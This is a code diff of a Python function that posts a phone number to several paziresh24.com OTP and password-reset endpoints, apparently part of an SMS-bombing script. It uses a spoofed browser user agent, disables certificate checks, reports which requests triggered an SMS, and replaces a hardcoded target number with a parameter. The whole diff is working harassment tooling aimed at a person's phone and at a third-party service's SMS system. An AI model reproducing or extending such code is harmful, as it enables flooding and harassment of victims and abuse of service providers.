@@ -65,15 +65,9 @@ def send_service_safe(service, phone):
 # ==========================
 
 
-import requests
-import re
-
-def paziresh24():
+def paziresh24(phone):
     try:
         session = requests.Session()
-
-        # شماره ثابت
-        phone = "09173644430"
 
         # نرمال‌سازی شماره موبایل
         digits = re.sub(r'\D', '', phone)
@@ -87,7 +81,7 @@ def paziresh24():
 
         # اعتبارسنجی نهایی
         if len(formatted_phone) != 11 or not formatted_phone.startswith("09"):
-            print("❌ شماره موبایل نامعتبر است")
+            print(f'{r}❌ شماره موبایل نامعتبر است{a}')
             return False
 
         # ثبت رویداد اولیه در Splunk
@@ -108,7 +102,7 @@ def paziresh24():
                     "host": "www.paziresh24.com"
                 },
                 "popupForm": True,
-                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X)",
+                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
                 "terminal_id": "clinic-68b0f1d69b0897.11243898",
                 "is_application": False
             }
@@ -135,6 +129,7 @@ def paziresh24():
             "resetpassword": "https://apigw.paziresh24.com/gozargah/resetpassword"
         }
 
+        success = False
         for name, url in endpoints.items():
             payload = {"mobile": formatted_phone}
             response = session.post(
@@ -145,23 +140,24 @@ def paziresh24():
                 verify=False
             )
 
-            print(f"[{name}] Status Code: {response.status_code}")
+            print(f'{y}[{name}] Status: {response.status_code}{a}')
             try:
                 data = response.json()
-                print(f"[{name}] Response: {data}")
+                print(f'{y}[{name}] Response: {data}{a}')
 
                 # بررسی دقیق موفقیت
-                if data.get("code") == 0 and "Success" in data.get("text", ""):
-                    print(f"[{name}] پیامک با موفقیت ارسال شد ✅")
+                if response.status_code == 200 and data.get("status") == 1:
+                    print(f'{g}[{name}] SMS sent successfully! ✅{a}')
+                    success = True
                 else:
-                    print(f"[{name}] ارسال پیامک ناموفق ❌ - {data.get('message')}")
-            except Exception as e:
-                print(f"[{name}] خطا در خواندن پاسخ: {e}")
+                    print(f'{r}[{name}] Failed: {data.get("message", "Unknown error")} ❌{a}')
+            except:
+                print(f'{r}[{name}] Error reading response ❌{a}')
 
-        return True
+        return success
 
     except Exception as e:
-        print(f"[!] خطای کلی: {e}")
+        print(f'{r}[!] paziresh24 exception: {e}{a}')
         return False
 
                 
